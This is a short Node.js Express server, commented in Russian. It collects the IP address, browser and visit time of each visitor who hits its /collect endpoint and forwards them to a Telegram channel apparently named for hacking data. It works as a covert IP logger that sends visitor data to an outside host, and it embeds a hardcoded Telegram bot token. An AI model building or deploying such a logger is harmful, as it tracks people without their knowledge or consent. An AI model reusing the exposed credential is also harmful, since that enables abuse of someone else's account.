const express = require('express');
 const axios = require('axios');
 const app = express();
 
 const TOKEN = '7962767337:AAG1w_PlojpJ8GCkTKIPvinNiGomB6gqQEo'; // Токен бота
 const CHANNEL = '@vlomvlomdata'; // Название канала с @
 
 app.use(express.json());
 app.use(express.static('public'));
 
 app.post('/collect', (req, res) => {
     const data = req.body;
     const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket.remoteAddress;
     const text = `Зашёл Юзер:\n- IP: ${ip}\n- Браузер: ${data.userAgent}\n- Время: ${data.time}`;
 
     axios.post(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
         chat_id: CHANNEL,
         text: text
     })
     .then(() => res.send('Ушло'))
     .catch(() => res.send('Пиздец, ошибка'));
 });
 
 const port = process.env.PORT || 3000;
 app.listen(port, () => console.log(`Пашет на порту ${port}`));